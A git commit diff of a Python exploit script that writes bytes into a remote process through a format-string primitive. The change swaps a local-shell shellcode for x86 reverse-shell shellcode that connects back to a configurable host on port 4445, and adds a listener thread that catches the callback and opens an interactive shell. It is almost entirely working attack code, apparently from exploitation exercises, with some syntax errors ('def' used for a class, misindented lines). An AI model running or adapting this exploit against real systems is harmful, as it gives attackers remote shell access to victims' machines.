bd68bb176989a77e1d10cb663505ae27d0b7faf5
TstevetsT <kaosnannaz@gmail.com>
2015-06-29 00:59:05 -0700

    t

--- a4.py
+++ a4.py
@@ -34,9 +34,35 @@ def writeByte(s, addr, val, idx):
     print "           Writing: ord(b)=%d" % val
     s.send(format)
 
-sc ="\xbb\x04\x00\x00\x00\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80" + \
-"\x41\xe2\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" + \
-"\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+def Listener(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        
+    def run(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(('', 4445))
+        s.listen(1)
+        s.settimeout(10)
+        t = telnetlib.Telnet()
+        try:
+            conn, tgt = s.accept()
+        except socket.timeout:
+            print "socket timed out. quitting..."
+            sys.exit()
+        print "incoming connection from: " + str(tgt)
+            t.sock = conn
+            t.interact()
+
+host = "127.0.0.1"
+lhost = host.split(".")
+
+sc ="\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93" + \
+"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68" + \
+chr(int(lhost[0])) + chr(int(lhost[1])) + chr(int(lhost[2])) + chr(int(lhost[3])) + \
+"\x68\x02\x00" + \
+"\x11\x5d\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52" + \
+"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1" + \
+"\xb0\x0b\xcd\x80"
 
 s = socket.socket()
 s.connect((sys.argv[1], int(sys.argv[2])))
@@ -80,6 +106,8 @@ for i in range(4):
     writeByte(s, exit + i, (argv>> (8 * i)) & 0xff, buf_start)
 #readLine(s)
 
-#s.send('quit\n')
+s.send('quit\n')
+
+l = Listener().start()
 
 interact(s)
